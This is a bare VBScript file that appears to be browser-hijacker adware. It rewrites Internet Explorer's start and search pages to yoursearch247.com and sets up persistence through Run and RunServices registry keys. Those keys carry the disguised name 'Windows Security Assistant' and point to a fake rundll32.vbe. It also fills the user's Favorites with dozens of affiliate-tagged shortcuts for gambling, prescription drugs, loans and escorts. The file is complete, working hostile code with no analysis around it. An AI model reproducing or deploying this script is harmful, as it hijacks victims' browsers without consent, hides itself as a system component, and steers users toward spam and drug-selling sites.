Set WSHShell = WScript.CreateObject("WScript.Shell")
FilePath = WSHShell.ExpandEnvironmentStrings("%windir%\system32\rundll32.vbe")
HomePage="http://www.yoursearch247.com/"
SearchPage="http://www.yoursearch247.com/se.html"
WSHShell.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", HomePage
WSHShell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer\Main\SearchURL", HomePage
WSHShell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer\Main\Search Page", SearchPage
WSHShell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer\Main\Search Bar", SearchPage
WSHShell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer\Main\Default_Search_URL", SearchPage
WSHShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Main\Start Page", HomePage
WSHShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Main\SearchURL", HomePage
WSHShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Main\Search Page", SearchPage
WSHShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Main\Search Bar", SearchPage
WSHShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Main\Default_Search_URL", SearchPage
WSHShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Search\SearchAssistant", SearchPage
WSHShell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer\TypedURLs\url1", HomePage
WSHShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Windows Security Assistant", FilePath
WSHShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices\Windows Security Assistant", FilePath
WSHShell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Windows Security Assistant", FilePath
f = WSHShell.SpecialFolders("Favorites")
Set FSA = CreateObject("Scripting.FileSystemObject")
if(FSA.FolderExists(f & "\Business and Finance !")=false) then
FSA.CreateFolder(f & "\Business and Finance !")
end if
Set M1 = WSHShell.CreateShortcut(f & "\Business and Finance !\Bad Credit.URL")
M1.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=bad+credit")
M1.Save()
Set M1 = WSHShell.CreateShortcut(f & "\Business and Finance !\Bankruptcy.URL")
M1.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=bankruptcy")
M1.Save()
Set M1 = WSHShell.CreateShortcut(f & "\Business and Finance !\Bill Consolidation.URL")
M1.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=bill+consolidation")
M1.Save()
Set M1 = WSHShell.CreateShortcut(f & "\Business and Finance !\Credit Card Debt.URL")
M1.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=credit+card+debt")
M1.Save()
Set M1 = WSHShell.CreateShortcut(f & "\Business and Finance !\Credit Counseling.URL")
M1.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=credit+counseling")
M1.Save()
Set M1 = WSHShell.CreateShortcut(f & "\Business and Finance !\Credit Repair.URL")
M1.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=credit+repair")
M1.Save()
Set M1 = WSHShell.CreateShortcut(f & "\Business and Finance !\Debp Consolidation.URL")
M1.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=debp+consolidation")
M1.Save()
Set M1 = WSHShell.CreateShortcut(f & "\Business and Finance !\Debt Free.URL")
M1.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=debt+free")
M1.Save()
Set M1 = WSHShell.CreateShortcut(f & "\Business and Finance !\Health Insurance.URL")
M1.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=health+insurance")
M1.Save()
Set M1 = WSHShell.CreateShortcut(f & "\Business and Finance !\Home Equity Loan.URL")
M1.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=home+equity+loan")
M1.Save()
Set M1 = WSHShell.CreateShortcut(f & "\Business and Finance !\Home Insurance.URL")
M1.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=home+insurance")
M1.Save()
Set M1 = WSHShell.CreateShortcut(f & "\Business and Finance !\Home Loan.URL")
M1.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=home+loan")
M1.Save()
Set M1 = WSHShell.CreateShortcut(f & "\Business and Finance !\Money Management.URL")
M1.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=money+management")
M1.Save()
Set M1 = WSHShell.CreateShortcut(f & "\Business and Finance !\Mortgage Rates.URL")
M1.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=mortgage+rates")
M1.Save()
Set M1 = WSHShell.CreateShortcut(f & "\Business and Finance !\Mortgage Quote.URL")
M1.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=mortgage+quote")
M1.Save()
Set M1 = WSHShell.CreateShortcut(f & "\Business and Finance !\Moving companies.URL")
M1.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=moving+companies")
M1.Save()
Set M1 = WSHShell.CreateShortcut(f & "\Business and Finance !\Pay Day Loan.URL")
M1.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=pay+day+loan")
M1.Save()
Set M1 = WSHShell.CreateShortcut(f & "\Business and Finance !\Personal Finance.URL")
M1.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=personal+finance")
M1.Save()
Set M1 = WSHShell.CreateShortcut(f & "\Business and Finance !\Refinance Mortgage.URL")
M1.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=refinance+mortgage")
M1.Save()
Set M1 = WSHShell.CreateShortcut(f & "\Business and Finance !\Term Life Insurance.URL")
M1.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=term+life+insurance")
M1.Save()
if(FSA.FolderExists(f & "\Computers and HiTech !")=false) then
FSA.CreateFolder(f & "\Computers and HiTech !")
end if
Set M2 = WSHShell.CreateShortcut(f & "\Computers and HiTech !\DirecTV.URL")
M2.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=directv")
M2.Save()
Set M2 = WSHShell.CreateShortcut(f & "\Computers and HiTech !\Mobile Phone.URL")
M2.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=mobile+phone")
M2.Save()
Set M2 = WSHShell.CreateShortcut(f & "\Computers and HiTech !\Antivirus.URL")
M2.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=antivirus")
M2.Save()
Set M2 = WSHShell.CreateShortcut(f & "\Computers and HiTech !\Dedicated Servers.URL")
M2.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=dedicated+servers")
M2.Save()
Set M2 = WSHShell.CreateShortcut(f & "\Computers and HiTech !\Domain Names.URL")
M2.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=domain+names")
M2.Save()
Set M2 = WSHShell.CreateShortcut(f & "\Computers and HiTech !\Web Design.URL")
M2.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=web+design")
M2.Save()
Set M2 = WSHShell.CreateShortcut(f & "\Computers and HiTech !\Web Hosting.URL")
M2.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=web+hosting")
M2.Save()
if(FSA.FolderExists(f & "\Education !")=false) then
FSA.CreateFolder(f & "\Education !")
end if
Set M3 = WSHShell.CreateShortcut(f & "\Education !\Adult Education.URL")
M3.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=adult+education")
M3.Save()
Set M3 = WSHShell.CreateShortcut(f & "\Education !\Computer Traning.URL")
M3.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=computer+traning")
M3.Save()
Set M3 = WSHShell.CreateShortcut(f & "\Education !\Distance Learning.URL")
M3.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=distance+learning")
M3.Save()
Set M3 = WSHShell.CreateShortcut(f & "\Education !\Home Work.URL")
M3.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=home+work")
M3.Save()
Set M3 = WSHShell.CreateShortcut(f & "\Education !\University Degree.URL")
M3.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=university+degree")
M3.Save()
Set M3 = WSHShell.CreateShortcut(f & "\Education !\Work From Home.URL")
M3.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=work+from+home")
M3.Save()
if(FSA.FolderExists(f & "\Entertainment !")=false) then
FSA.CreateFolder(f & "\Entertainment !")
end if
Set M4 = WSHShell.CreateShortcut(f & "\Entertainment !\Airline Ticket.URL")
M4.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=airline+ticket")
M4.Save()
Set M4 = WSHShell.CreateShortcut(f & "\Entertainment !\Carnival Cruises.URL")
M4.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=carnival+cruises")
M4.Save()
Set M4 = WSHShell.CreateShortcut(f & "\Entertainment !\Celebrity Cruises.URL")
M4.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=celebrity+cruises")
M4.Save()
Set M4 = WSHShell.CreateShortcut(f & "\Entertainment !\Cruise.URL")
M4.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=cruise")
M4.Save()
Set M4 = WSHShell.CreateShortcut(f & "\Entertainment !\Disney Cruise.URL")
M4.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=disney+cruise")
M4.Save()
Set M4 = WSHShell.CreateShortcut(f & "\Entertainment !\Escorts.URL")
M4.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=escorts")
M4.Save()
Set M4 = WSHShell.CreateShortcut(f & "\Entertainment !\Hotels.URL")
M4.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=hotels")
M4.Save()
Set M4 = WSHShell.CreateShortcut(f & "\Entertainment !\Online Poker.URL")
M4.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=online+poker")
M4.Save()
Set M4 = WSHShell.CreateShortcut(f & "\Entertainment !\Panama Canal Cruises.URL")
M4.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=panama+canal+cruises")
M4.Save()
if(FSA.FolderExists(f & "\Gambling !")=false) then
FSA.CreateFolder(f & "\Gambling !")
end if
Set M5 = WSHShell.CreateShortcut(f & "\Gambling !\Basketball Betting.URL")
M5.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=basketball+betting")
M5.Save()
Set M5 = WSHShell.CreateShortcut(f & "\Gambling !\Black Jack.URL")
M5.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=black+jack")
M5.Save()
Set M5 = WSHShell.CreateShortcut(f & "\Gambling !\Football Betting.URL")
M5.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=football+betting")
M5.Save()
Set M5 = WSHShell.CreateShortcut(f & "\Gambling !\Football Wagering.URL")
M5.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=football+wagering")
M5.Save()
Set M5 = WSHShell.CreateShortcut(f & "\Gambling !\Gambling.URL")
M5.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=gambling")
M5.Save()
Set M5 = WSHShell.CreateShortcut(f & "\Gambling !\Las Vegas Casino.URL")
M5.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=las+vegas+casino")
M5.Save()
Set M5 = WSHShell.CreateShortcut(f & "\Gambling !\Live Poker.URL")
M5.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=live+poker")
M5.Save()
Set M5 = WSHShell.CreateShortcut(f & "\Gambling !\Multi Player.URL")
M5.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=multi+player")
M5.Save()
Set M5 = WSHShell.CreateShortcut(f & "\Gambling !\Online Casino.URL")
M5.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=online+casino")
M5.Save()
Set M5 = WSHShell.CreateShortcut(f & "\Gambling !\Poker.URL")
M5.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=poker")
M5.Save()
Set M5 = WSHShell.CreateShortcut(f & "\Gambling !\Roulette.URL")
M5.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=roulette")
M5.Save()
Set M5 = WSHShell.CreateShortcut(f & "\Gambling !\Slots.URL")
M5.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=slots")
M5.Save()
Set M5 = WSHShell.CreateShortcut(f & "\Gambling !\Sports Books.URL")
M5.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=sports+books")
M5.Save()
if(FSA.FolderExists(f & "\Health and Beauty !")=false) then
FSA.CreateFolder(f & "\Health and Beauty !")
end if
Set M6 = WSHShell.CreateShortcut(f & "\Health and Beauty !\Adipex.URL")
M6.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=adipex")
M6.Save()
Set M6 = WSHShell.CreateShortcut(f & "\Health and Beauty !\Breast Enlargement.URL")
M6.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=breast+enlargement")
M6.Save()
Set M6 = WSHShell.CreateShortcut(f & "\Health and Beauty !\Diet Pills.URL")
M6.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=diet+pills")
M6.Save()
Set M6 = WSHShell.CreateShortcut(f & "\Health and Beauty !\Fioricet.URL")
M6.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=fioricet")
M6.Save()
Set M6 = WSHShell.CreateShortcut(f & "\Health and Beauty !\Fitness.URL")
M6.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=fitness")
M6.Save()
Set M6 = WSHShell.CreateShortcut(f & "\Health and Beauty !\Flexeril.URL")
M6.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=flexeril")
M6.Save()
Set M6 = WSHShell.CreateShortcut(f & "\Health and Beauty !\Ionamin.URL")
M6.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=ionamin")
M6.Save()
Set M6 = WSHShell.CreateShortcut(f & "\Health and Beauty !\Online Pharmacy.URL")
M6.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=online+pharmacy")
M6.Save()
Set M6 = WSHShell.CreateShortcut(f & "\Health and Beauty !\Paxil.URL")
M6.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=paxil")
M6.Save()
Set M6 = WSHShell.CreateShortcut(f & "\Health and Beauty !\Penis Enlargement.URL")
M6.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=penis+enlargement")
M6.Save()
Set M6 = WSHShell.CreateShortcut(f & "\Health and Beauty !\Phentermine.URL")
M6.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=phentermine")
M6.Save()
Set M6 = WSHShell.CreateShortcut(f & "\Health and Beauty !\Prozac.URL")
M6.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=prozac")
M6.Save()
Set M6 = WSHShell.CreateShortcut(f & "\Health and Beauty !\Renova.URL")
M6.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=renova")
M6.Save()
Set M6 = WSHShell.CreateShortcut(f & "\Health and Beauty !\Soma.URL")
M6.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=soma")
M6.Save()
Set M6 = WSHShell.CreateShortcut(f & "\Health and Beauty !\Tramadol.URL")
M6.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=tramadol")
M6.Save()
Set M6 = WSHShell.CreateShortcut(f & "\Health and Beauty !\Valium.URL")
M6.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=valium")
M6.Save()
Set M6 = WSHShell.CreateShortcut(f & "\Health and Beauty !\Weight Loss Pills.URL")
M6.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=weight+loss+pills")
M6.Save()
Set M6 = WSHShell.CreateShortcut(f & "\Health and Beauty !\Xanax.URL")
M6.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=xanax")
M6.Save()
if(FSA.FolderExists(f & "\Insurance !")=false) then
FSA.CreateFolder(f & "\Insurance !")
end if
Set M7 = WSHShell.CreateShortcut(f & "\Insurance !\Auto Insurance.URL")
M7.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=auto+insurance")
M7.Save()
Set M7 = WSHShell.CreateShortcut(f & "\Insurance !\Business Insurance.URL")
M7.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=business+insurance")
M7.Save()
Set M7 = WSHShell.CreateShortcut(f & "\Insurance !\Free Insurance Quote.URL")
M7.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=free+insurance+quote")
M7.Save()
Set M7 = WSHShell.CreateShortcut(f & "\Insurance !\Home Insurance.URL")
M7.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=home+insurance")
M7.Save()
Set M7 = WSHShell.CreateShortcut(f & "\Insurance !\Life Insurance.URL")
M7.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=life+insurance")
M7.Save()
Set M7 = WSHShell.CreateShortcut(f & "\Insurance !\Term Insurance.URL")
M7.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=term+insurance")
M7.Save()
Set M7 = WSHShell.CreateShortcut(f & "\Insurance !\Travel Health Insurance.URL")
M7.TargetPath = WSHShell.ExpandEnvironmentStrings("http://www.yoursearch247.com/search.php?aff=3811&qq=travel+health+insurance")
M7.Save()